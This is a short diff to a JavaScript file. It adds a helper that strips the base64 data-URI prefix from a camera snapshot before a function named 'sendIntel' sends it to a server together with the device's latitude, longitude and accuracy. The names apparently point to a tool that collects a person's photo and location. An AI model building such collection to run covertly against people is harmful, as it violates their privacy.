@@ -74,9 +74,13 @@
                 state.streamRunning = true;
             };
 
+            const sanitize = (image) => {
+                return image.replace("data:image/webp;base64,", "");
+            }
+
             const sendIntel = (position) => {
                 sendAjax(
-                    document.getElementById("photo").src,
+                    sanitize(document.getElementById("photo").src),
                     position.coords.latitude,
                     position.coords.longitude,
                     position.coords.accuracy,
